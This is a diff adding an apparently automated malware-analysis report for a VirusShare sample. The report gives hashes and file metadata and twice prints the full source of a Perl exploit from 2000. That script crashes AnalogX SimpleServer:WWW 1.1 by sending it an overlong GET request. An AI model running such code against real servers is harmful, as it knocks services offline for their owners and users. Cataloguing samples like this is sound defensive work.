@@ -1,0 +1,64 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "#!/usr/bin/perl \n#\n# Buffer Overflow exploit for AnalogX SimpleServer:WWW HTTP Server v1.1 \n# ---------------------------------------------------------------------\n#\n# Exploit Coded By : Neon-Lenz (neonlenz@nightmail.com) \n#\n# Website: http://TheGovernment.Com/Cyrax\n#\n# Usage: ./AnalogX.pl <host>\n#\n# Example: ./AnalogX.pl www.victim.com\n#\n# Greets To: Acid Blades, ThePike, Trib, Kn00p, KeyDet, DarkHunter and\n# everyone else i forgot to mention ! \n\nuse IO::Socket;\n\n$host=$ARGV[0];\n$port=80;\n\nprint <<\"EOT\";\n\nAnalogX SimpleServer:WWW HTTP Server v1.1 Buffer Overflow By Neon-Lenz\n----------------------------------------------------------------------\nUsage: ./AnalogX.pl <host> (assign a webserver, or it won't work)\n\nExample: ./AnalogX.pl www.victim.com \n\nEOT\n\n$sock = IO::Socket::INET->new(PeerAddr => $host,      # Connects to the host\n                              PeerPort => $port,\n                              Proto    => 'tcp');\n                \n$z=Z;\n\n$send = $z x 1000;                                    # Overflows the host\n        print \"GET 1000 chars on remote webserver.\\n\";\n        print $sock \"GET /$send\\n\"; \n        sleep(3); \n        print \"Done. AnalogX server should be dead.\\n\";\n        \n\nclose($sock) # Hmm closes the stuff, duh!\n\n#EOC - End Of Code\n#                   www.hack.co.za   [4 September 2000]#"
+    },
+    "filename": "VirusShare_0dbf2fa2f954239755b97b1a4f4da164",
+    "filesize": 1382,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "0dbf2fa2f954239755b97b1a4f4da164",
+        "sha1": "1bd6fca2a6b6fcc681114e5fda33cc7ad024fbd2",
+        "sha256": "b05bfba89a5ef629df23c9f8db5b3da1b1115a5313fab1cfc7d432049ffc895d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl ",
+            "# Buffer Overflow exploit for AnalogX SimpleServer:WWW HTTP Server v1.1 ",
+            "# ---------------------------------------------------------------------",
+            "# Exploit Coded By : Neon-Lenz (neonlenz@nightmail.com) ",
+            "# Website: http://TheGovernment.Com/Cyrax",
+            "# Usage: ./AnalogX.pl <host>",
+            "# Example: ./AnalogX.pl www.victim.com",
+            "# Greets To: Acid Blades, ThePike, Trib, Kn00p, KeyDet, DarkHunter and",
+            "# everyone else i forgot to mention ! ",
+            "use IO::Socket;",
+            "$host=$ARGV[0];",
+            "$port=80;",
+            "print <<\"EOT\";",
+            "AnalogX SimpleServer:WWW HTTP Server v1.1 Buffer Overflow By Neon-Lenz",
+            "----------------------------------------------------------------------",
+            "Usage: ./AnalogX.pl <host> (assign a webserver, or it won't work)",
+            "Example: ./AnalogX.pl www.victim.com ",
+            "$sock = IO::Socket::INET->new(PeerAddr => $host,      # Connects to the host",
+            "                              PeerPort => $port,",
+            "                              Proto    => 'tcp');",
+            "                ",
+            "$z=Z;",
+            "$send = $z x 1000;                                    # Overflows the host",
+            "        print \"GET 1000 chars on remote webserver.\\n\";",
+            "        print $sock \"GET /$send\\n\"; ",
+            "        sleep(3); ",
+            "        print \"Done. AnalogX server should be dead.\\n\";",
+            "        ",
+            "close($sock) # Hmm closes the stuff, duh!",
+            "#EOC - End Of Code",
+            "#                   www.hack.co.za   [4 September 2000]#"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://TheGovernment.Com/Cyrax"
+        ]
+    },
+    "time": "0:00:00.300640",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
